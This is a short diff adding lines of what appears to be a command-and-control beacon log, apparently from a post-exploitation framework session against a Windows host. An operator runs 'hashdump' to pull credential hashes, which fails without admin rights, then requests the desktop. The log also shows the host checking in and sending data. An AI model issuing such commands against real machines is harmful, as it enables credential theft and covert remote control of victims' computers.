@@ -1,0 +1,8 @@
+03/17 03:04:59 [metadata] 192.168.1.104 <- 169.254.245.9; computer: SAMSUNG; user: Samsung 700Z5C; pid: 16396; os: Windows; version: 10.0; beacon arch: x86 (x64)
+03/17 03:05:18 [input] <neo> hashdump
+03/17 03:05:18 [error] this command requires administrator privileges
+03/17 03:05:50 [checkin] host called home, sent: 19 bytes
+03/17 03:06:45 [input] <neo> desktop
+03/17 03:06:51 [checkin] host called home, sent: 115 bytes
+03/17 03:06:51 [error] could not open d:/\*: 21
+03/17 03:21:13 [metadata] 192.168.1.104 <- 169.254.245.9; computer: SAMSUNG; user: Samsung 700Z5C; pid: 16396; os: Windows; version: 10.0; beacon arch: x86 (x64)
